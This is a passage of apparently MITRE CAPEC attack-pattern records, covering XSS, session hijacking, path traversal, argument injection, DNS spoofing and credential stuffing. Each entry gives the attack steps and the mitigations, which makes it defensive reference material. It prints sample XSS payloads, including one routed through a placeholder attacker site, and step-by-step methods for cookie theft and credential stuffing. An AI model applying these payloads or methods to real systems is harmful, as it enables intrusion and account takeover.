HTML by dynamically manipulating the DOM via a document.write() call. <script>document.write(<p>Mode is: + document.location.href.substring(document.location.href.indexOf('mode=') + 5) + </p>);</script> Notice how the value provided on the URL is used directly with no input validation performed and no output encoding in place. A maliciously crafted URL can thus be formed such that if a victim clicked on the URL, a malicious script would then be executed by the victim’s browser: http://my.site.com/aform.html?mode=<script>alert('hi');</script>::In some DOM-based attacks, the malicious script never gets sent to the web server at all, thus bypassing any server-side protections that might be in place. Consider the previously used web application that displays the mode value. Since the HTML is being generated dynamically through DOM manipulations, a URL fragment (i.e., the part of a URL after the '#' character) can be used. http://my.site.com/aform.html#mode=<script>alert('hi')</script> In this variation of a DOM-based XSS attack, the malicious script will not be sent to the web server, but will instead be managed by the victim's browser and is still available to the client-side script code.::\",\"::79::20::83::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Reflected DOM Injection::\",\"\",\n589,\"DNS Blocking\",Detailed,Draft,\"An adversary intercepts traffic and intentionally drops DNS requests based on content in the request. In this way, the adversary can deny the availability of specific services or content to the user even if the IP address is changed.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:603::\",\"\",\"::This attack requires the ability to conduct deep packet inspection with an In-Path device that can drop the targeted traffic and/or connection.::\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Preventing DNS from resolving a request denies the availability of a target site or service for the user.::\",\"::Hard Coded Alternate DNS server in applications::Avoid dependence on DNS::Include hosts file/IP address in the application.::Ensure best practices with respect to communications channel protections.::Use a .onion domain with Tor support::\",\"::Full URL Based Filtering: Filtering based upon the requested URL. URL String-based Filtering: Filtering based upon the use of particular strings included in the requested URL.::\",\"::300::\",\"\",\"\",\n59,\"Session Credential Falsification through Prediction\",Detailed,Draft,\"This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:196::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find Session IDs] The attacker interacts with the target host and finds that session IDs are used to authenticate users.:TECHNIQUE:An attacker makes many anonymous connections and records the session IDs assigned.:TECHNIQUE:An attacker makes authorized connections and records the session tokens or credentials issued.::STEP:2:PHASE:Explore:DESCRIPTION:[Characterize IDs] The attacker studies the characteristics of the session ID (size, format, etc.). As a results the attacker finds that legitimate session IDs are predictable.:TECHNIQUE:Cryptanalysis. The attacker uses cryptanalysis to determine if the session IDs contain any cryptographic protections.:TECHNIQUE:Pattern tests. The attacker looks for patterns (odd/even, repetition, multiples, or other arithmetic relationships) between IDs:TECHNIQUE:Comparison against time. The attacker plots or compares the issued IDs to the time they were issued to check for correlation.::STEP:3:PHASE:Experiment:DESCRIPTION:[Match issued IDs] The attacker brute forces different values of session ID and manages to predict a valid session ID.:TECHNIQUE:The attacker models the session ID algorithm enough to produce a compatible session IDs, or just one match.::STEP:4:PHASE:Exploit:DESCRIPTION:[Use matched Session ID] The attacker uses the falsified session ID to access the target system.:TECHNIQUE:The attacker loads the session ID into their web browser and browses to restricted data or functionality.:TECHNIQUE:The attacker loads the session ID into their network communications and impersonates a legitimate user to gain access to data or functionality.::\",\"::The target host uses session IDs to keep track of the users.::Session IDs are used to control access to resources.::The session IDs used by the target host are predictable. For example, the session IDs are generated using predictable information (e.g., time).::\",\"::SKILL:There are tools to brute force session ID. Those tools require a low level of knowledge.:LEVEL:Low::SKILL:Predicting Session ID may require more computation work which uses advanced analysis such as statistical analysis.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Use a strong source of randomness to generate a session ID.::Use adequate length session IDs::Do not use information available to the user in order to generate session ID (e.g., time).::Ideas for creating random numbers are offered by Eastlake [RFC1750]::Encrypt the session ID if you expose it to the user. For instance session ID can be stored in a cookie in encrypted format.::\",\"::Jetty before 4.2.27, 5.1 before 5.1.12, 6.0 before 6.0.2, and 6.1 before 6.1.0pre3 generates predictable session identifiers using java.util.random, which makes it easier for remote attackers to guess a session identifier through brute force attacks, bypass authentication requirements, and possibly conduct cross-site request forgery attacks. See also: CVE-2006-6969::mod_usertrack in Apache 1.3.11 through 1.3.20 generates session ID's using predictable information including host IP address, system time and server process ID, which allows local users to obtain session ID's and bypass authentication when these session ID's are used for authentication. See also: CVE-2001-1534::\",\"::290::330::331::346::488::539::200::6::285::384::693::\",\"TAXONOMY NAME:WASC:ENTRY ID:18:ENTRY NAME:Credential/Session Prediction::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Session Prediction::\",\"\","
  },
  "doc-df83ee186f499d15c08f201feaaa5717": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n590,\"IP Address Blocking\",Detailed,Draft,\"An adversary performing this type of attack drops packets destined for a target IP address. The aim is to prevent access to the service hosted at the target IP address.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:603::\",\"\",\"::This attack requires the ability to conduct deep packet inspection with an In-Path device that can drop the targeted traffic and/or connection.::\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Blocking packets intended for a target IP address denies its availability to the user.::\",\"::Have a large pool of backup IPs built into the application and support proxy capability in the application.::\",\"::Consider situations of information censorship for political purposes, where regimes that prevent access to specific web services.::\",\"::300::\",\"\",\"\",\n591,\"Reflected XSS\",Detailed,Stable,\"This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is reflected off a vulnerable web application and then executed by a victim's browser. The process starts with an adversary delivering a malicious script to a victim and convincing the victim to send the script to the vulnerable web application.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:63::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for reflected XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads and special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of HTML special characters to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Change a URL parameter to include a malicious script tag.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::\",\"::An application that leverages a client-side web browser with scripting enabled.::An application that fail to adequately sanitize or encode untrusted input.::\",\"::SKILL:Requires the ability to write malicious scripts and embed them into HTTP requests.:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:A successful Reflected XSS attack can enable an adversary to exfiltrate sensitive information from the application.::SCOPE:Confidentiality:SCOPE:Authorization:SCOPE:Access Control:TECHNICAL IMPACT:Gain Privileges:NOTE:A successful Reflected XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:A successful Reflected attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:NOTE:A successful Reflected attack can allow an adversary to tamper with application data.::\",\"::Use browser technologies that do not allow client-side scripting.::Utilize strict type, character, and encoding enforcement.::Ensure that all user-supplied input is validated before use.::\",\"::Consider a web application that enables or disables some of the fields of a form on the page via the use of a mode parameter provided on the query string. http://my.site.com/aform.html?mode=full The application’s server-side code may want to display this mode value in the HTML page being created to give the users an understanding of what mode they are in. In this example, PHP is used to pull the value from the URL and generate the desired HTML. <?phpecho 'Mode is: ' . $_GET[mode];?> Notice how the value provided on the URL is used directly with no input validation performed and no output encoding in place. A maliciously crafted URL can thus be formed such that if a victim clicked on the URL, a malicious script would then be executed by the victim’s browser: http://my.site.com/aform.html?mode=<script>alert('hi');</script>::Reflected XSS attacks can take advantage of HTTP headers to compromise a victim. For example, assume a vulnerable web application called ‘mysite’ dynamically generates a link using an HTTP header such as HTTP_REFERER. Code somewhere in the application could look like: <?phpecho <a href=$_SERVER['HTTP_REFERER']>Test URL</a>?> The HTTP_REFERER header is populated with the URI that linked to the currently executing page. A web site can be created and hosted by an adversary that takes advantage of this by adding a reference to the vulnerable web application. By tricking a victim into clicking a link that executes the attacker’s web page, such as: http://attackerswebsite.com?<script>malicious content</script> The vulnerable web application ('mysite') is now called via the attacker's web site, initiated by the victim's web browser. The HTTP_REFERER header will contain a malicious script, which is embedded into the page by the vulnerable application and served to the victim. The victim’s web browser then executes the injected script, thus compromising the victim’s machine.::\",\"::79::\",\"\",\"\",\n592,\"Stored XSS\",Detailed,Stable,\"An adversary utilizes a form of Cross-site Scripting (XSS) where a malicious script is persistently stored within the data storage of a vulnerable web application as valid input.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:63::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for stored user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application. The adversary is looking for areas where user input is stored, such as user profiles, shopping carts, file managers, forums, blogs, and logs.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for stored XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads and special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Use a list of XSS probe strings to submit script in input fields that could be stored by the web application. If possible, the probe strings contain a unique identifier so they can be queried for after submitting to see if they are stored.:TECHNIQUE:Use a list of HTML special characters to submit in input fields that could be stored by the web application and check if they were properly encoded, replaced, or filtered out.::STEP:3:PHASE:Experiment:DESCRIPTION:[Store malicious XSS content] Once the adversary has determined which stored locations are vulnerable to XSS, they will interact with the web application to store the malicious content. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.:TECHNIQUE:Store a malicious script on a page that will execute when viewed by the victim.:TECHNIQUE:Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.:TECHNIQUE:Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.:TECHNIQUE:Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum.::\",\"::An application that leverages a client-side web browser with scripting enabled.::An application that fails to adequately sanitize or encode untrusted input.::An application that stores information provided by the user in data storage of some kind.::\",\"::SKILL:Requires the ability to write scripts of varying complexity and to inject them through user controlled fields within the application.:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:A successful Stored XSS attack can enable an adversary to exfiltrate sensitive information from the application.::SCOPE:Confidentiality:SCOPE:Authorization:SCOPE:Access Control:TECHNICAL IMPACT:Gain Privileges:NOTE:A successful Stored XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:A successful Stored XSS attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:NOTE:A successful Stored XSS attack can allow an adversary to tamper with application data.::\",\"::Use browser technologies that do not allow client-side scripting.::Utilize strict type, character, and encoding enforcement.::Ensure that all user-supplied input is validated before being stored.::\",\"::An adversary determines that a system uses a web based interface for administration. The adversary creates a new user record and supplies a malicious script in the user name field. The user name field is not validated by the system and a new log entry is created detailing the creation of the new user. Later, an administrator reviews the log in the administrative console. When the administrator comes across the new user entry, the browser sees a script and executes it, stealing the administrator's authentication cookie and forwarding it to the adversary. An adversary then uses the received authentication cookie to log in to the system as an administrator, provided that the administrator console can be accessed remotely.::An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. An adversary embeds JavaScript in the image tags of their message. The adversary then sends the victim an email advertising free goods and provides a link to the form for how to collect. When the victim visits the forum and reads the message, the malicious script is executed within the victim's browser.::\",\"::79::\",\"\",\"\",\n593,\"Session Hijacking\",Standard,Stable,\"This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The adversary is able to steal or manipulate an active session and use it to gain unathorized access to the application.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:21::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Discover Existing Session Token] Through varrying means, an adversary will discover and store an existing session token for some other authenticated user session.::STEP:2:PHASE:Experiment:DESCRIPTION:[Insert Found Session Token] The attacker attempts to insert a found session token into communication with the targeted application to confirm viability for exploitation.::STEP:3:PHASE:Exploit:DESCRIPTION:[Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim.::\",\"::An application that leverages sessions to perform authentication.::\",\"::SKILL:Exploiting a poorly protected identity token is a well understood attack with many helpful resources available.:LEVEL:Low::\",\"::The adversary must have the ability to communicate with the application over the network.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Gain Privileges:NOTE:A successful attack can enable an adversary to gain unauthorized access to an application.::\",\"::Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.::\",\"\",\"::287::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1185:ENTRY NAME:Browser Session Hijacking::::TAXONOMY NAME:ATTACK:ENTRY ID:1550.001:ENTRY NAME:Use Alternate Authentication Material:Application Access Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1563:ENTRY NAME:Remote Service Session Hijacking::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Session hijacking attack::\",\"\",\n594,\"Traffic Injection\",Meta,Stable,\"An adversary injects traffic into the target's network connection. The adversary is therefore able to degrade or disrupt the connection, and potentially modify the content. This is not a flooding attack, as the adversary is not focusing on exhausting resources. Instead, the adversary is crafting a specific input to affect the system in a particular way.\",\"\",,,\"\",\"\",\"::The target application must leverage an open communications channel.::The channel on which the target communicates must be vulnerable to interception (e.g., adversary in the middle attack - CAPEC-94).::\",\"\",\"::A tool, such as a MITM Proxy, that is capable of generating and injecting custom inputs to be used in the attack.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:NOTE:The injection of specific content into a connection can trigger a disruption in that communications channel, thereby denying availability of the service.::SCOPE:Integrity:TECHNICAL IMPACT:Other:NOTE:An adversary's injection of additional content into a communication channel negatively impacts the integrity of that channel.::\",\"\",\"\",\"::940::\",\"\",\"\",\n595,\"Connection Reset\",Standard,Draft,\"In this attack pattern, an adversary injects a connection reset packet to one or both ends of a target's connection. The attacker is therefore able to have the target and/or the destination server sever the connection without having to directly filter the traffic between them.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:594::\",\"\",\"::This attack requires the ability to monitor the target's network connection.::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::940::\",\"\",\"\",\n596,\"TCP RST Injection\",Detailed,Draft,\"An adversary injects one or more TCP RST packets to a target after the target has made a HTTP GET request. The goal of this attack is to have the target and/or destination web server terminate the TCP connection.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:595::\",\"\",\"::An On/In Path Device::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::940::\",\"\",\"\",\n597,\"Absolute Path Traversal\",Detailed,Draft,\"An adversary with access to file system resources, either directly or via application logic, will use various file absolute paths and navigation mechanisms such as .. to extend their range of access to inappropriate areas of the file system. The goal of the adversary is to access directories and files that are intended to be restricted from their access.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:126::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Fingerprinting of the operating system] In order to perform a valid path traversal, the adversary needs to know what the underlying OS is so that the proper file seperator is used.:TECHNIQUE:Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.:TECHNIQUE:TCP/IP Fingerprinting. The adversary uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:[Survey application] Using manual or automated means, an adversary will survey the target application looking for all areas where user input is taken to specify a file name or path.:TECHNIQUE:Use a spidering tool to follow and record all links on a web page. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of a web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore a website and analyze how it is constructed. Many browser's plug-in are available to facilitate the analysis or automate the URL discovery.::STEP:3:PHASE:Experiment:DESCRIPTION:[Attempt variations on input parameters] Using manual or automated means, an adversary attempts varying absolute file paths on all found user input locations and observes the responses.:TECHNIQUE:Access common files in root directories such as /bin, /boot, /lib, or /home:TECHNIQUE:Access a specific drive letter or windows volume letter by specifying C:dirname for example:TECHNIQUE:Access a known Windows UNC share by specifying UNCsharename for example::STEP:4:PHASE:Exploit:DESCRIPTION:[Access, modify, or execute arbitrary files.] An adversary injects absolute path traversal syntax into identified vulnerable inputs to cause inappropriate reading, writing or execution of files. An adversary could be able to read directories or files which they are normally not allowed to read. The adversary could also access data outside the web document root, or include scripts, source code and other kinds of files from external websites. Once the adversary accesses arbitrary files, they could also modify files. In particular situations, the adversary could also execute arbitrary code or system commands.:TECHNIQUE:Manipulate file and its path by injecting absolute path sequences (e.g. /home/file.txt).:TECHNIQUE:Download files, modify files, or try to execute shell commands (with binary files).::\",\"::The target must leverage and access an underlying file system.::\",\"::SKILL:Simple command line attacks.:LEVEL:Low::SKILL:Programming attacks.:LEVEL:Medium::\",\"::The attacker must have access to an application interface or a direct shell that allows them to inject directory strings and monitor the results.::\",\"\",\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:NOTE:The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:NOTE:The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.::\",\"::Design: Configure the access control correctly.::Design: Enforce principle of least privilege.::Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.::Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement.::Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.::Implementation: Perform input validation for all remote content, including remote and user-generated content.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.::Implementation: Use indirect references rather than actual file names.::Implementation: Use possible permissions on file access when developing and deploying web applications.::Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification using an allowlist approach.::\",\"\",\"::36::\",\"\",\"\",\n598,\"DNS Spoofing\",Detailed,Draft,\"An adversary sends a malicious (NXDOMAIN (No such domain) code, or DNS A record) response to a target's route request before a legitimate resolver can. This technique requires an On-path or In-path device that can monitor and respond to the target's DNS requests. This attack differs from BGP Tampering in that it directly responds to requests made by the target instead of polluting the routing the target's infrastructure uses.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:194::\",\"\",\"::On/In Path Device::\",\"::SKILL:To distribute email:LEVEL:Low::\",\"\",\"\",\"\",\"::Design: Avoid dependence on DNS::Design: Include hosts file/IP address in the application::Implementation: Utilize a .onion domain with Tor support::Implementation: DNSSEC::Implementation: DNS-hold-open::\",\"::Below-Recursive DNS Poisoning: When an On/In-path device between a recursive DNS server and a user sends a malicious (NXDOMAIN (No such domain) code, or DNS A record ) response before a legitimate resolver can.::Above-Recursive DNS Poisoning: When an On/In-path device between an authority server (e.g., government-managed) and a recursive DNS server sends a malicious (NXDOMAIN (No such domain)code, or a DNS record) response before a legitimate resolver can.::\",\"\",\"\",\"\",\n599,\"Terrestrial Jamming\",Detailed,Draft,\"In this attack pattern, the adversary transmits disruptive signals in the direction of the target's consumer-level satellite dish (as opposed to the satellite itself). The transmission disruption occurs in a more targeted range. Portable terrestrial jammers have a range of 3-5 kilometers in urban areas and 20 kilometers in rural areas. This technique requires a terrestrial jammer that is more powerful than the frequencies sent from the satellite.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:195::\",\"\",\"\",\"\",\"::A terrestrial satellite jammer with a signal more powerful than that of the satellite attempting to communicate with the target. The adversary must know the location of the target satellite dish.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:A successful attack will deny, degrade, or disrupt availability of satellite communications for the target by overwhelming its resources to accurately receive authorized transmissions.::\",\"\",\"::An attempt to deceive a GPS receiver by broadcasting counterfeit GPS signals, structured to resemble a set of normal GPS signals. These jamming signals may be structured in such a way as to cause the receiver to estimate its position to be somewhere other than where it actually is, or to be located where it is but at a different time, as determined by the adversary.::\",\"\",\"\",\"\",\n6,\"Argument Injection\",Standard,Draft,\"An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:137::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Discovery of potential injection vectors] Using an automated tool or manual discovery, the attacker identifies services or methods with arguments that could potentially be used as injection vectors (OS, API, SQL procedures, etc.).:TECHNIQUE:Manually cover the application and record the possible places where arguments could be passed into external systems.:TECHNIQUE:Use a spider, for web applications, to create a list of URLs and associated inputs.::STEP:2:PHASE:Experiment:DESCRIPTION:[1. Attempt variations on argument content] Possibly using an automated tool, the attacker will perform injection variations of the arguments.:TECHNIQUE:Use a very large list of probe strings in order to detect if there is a positive result, and, what type of system has been targeted (if obscure).:TECHNIQUE:Use a proxy tool to record results, error messages and/or log if accessible.::STEP:3:PHASE:Exploit:DESCRIPTION:[Abuse of the application] The attacker injects specific syntax into a particular argument in order to generate a specific malicious effect in the targeted application.:TECHNIQUE:Manually inject specific payload into targeted argument.::\",\"::Target software fails to strip all user-supplied input of any content that could cause the shell to perform unexpected actions.::Software must allow for unvalidated or unfiltered input to be executed on operating system shell, and, optionally, the system configuration must allow for output to be sent back to client.::\",\"::SKILL:The attacker has to identify injection vector, identify the operating system-specific commands, and optionally collect the output.:LEVEL:Medium::\",\"::Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.::Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.::Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise.::\",\"::A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [REF-482]::\",\"::74::146::184::78::185::697::\",\"\",\"\",\n60,\"Reusing Session IDs (aka Session Replay)\",Detailed,Draft,\"This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:593::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:The attacker interacts with the target host and finds that session IDs are used to authenticate users.::STEP:2:PHASE:Explore:DESCRIPTION:The attacker steals a session ID from a valid user.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker tries to use the stolen session ID to gain access to the system with the privileges of the session ID's original owner.::\",\"::The target host uses session IDs to keep track of the users.::Session IDs are used to control access to resources.::The session IDs used by the target host are not well protected from session theft.::\",\"::SKILL:If an attacker can steal a valid session ID, they can then try to be authenticated with that stolen session ID.:LEVEL:Low::SKILL:More sophisticated attack can be used to hijack a valid session from a user and spoof a legitimate user by reusing their valid session ID.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Always invalidate a session ID after the user logout.::Setup a session time out for the session IDs.::Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate adversary in the middle attacks (CAPEC-94).::Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.::Encrypt the session data associated with the session ID.::Use multifactor authentication.::\",\"::OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428::Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258::\",\"::294::290::346::384::488::539::200::285::664::732::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1134.001:ENTRY NAME:Access Token Manipulation:Token Impersonation/Theft::::TAXONOMY NAME:ATTACK:ENTRY ID:1550.004:ENTRY NAME:Use Alternate Authentication Material:Web Session Cookie::\",\"\",\n600,\"Credential Stuffing\",Standard,Stable,\"An adversary tries known username/password combinations against different systems, applications, or services to gain additional authenticated access. Credential Stuffing attacks rely upon the fact that many users leverage the same username/password combination for multiple systems, applications, and services.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:653::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known credentials] The adversary must obtain known credentials in order to access the target system, application, or service.:TECHNIQUE:An adversary purchases breached username/password combinations or leaked hashed passwords from the dark web.:TECHNIQUE:An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.:TECHNIQUE:An adversary conducts a sniffing attack to steal credentials as they are transmitted.:TECHNIQUE:An adversary gains access to a database and exfiltrates password hashes.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded credentials.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine target's password policy] Determine the password policies of the target system/application to determine if the known credentials fit within the specified criteria.:TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks if multiple passwords are known for a single user account).::STEP:3:PHASE:Experiment:DESCRIPTION:[Attempt authentication] Try each username/password combination until the 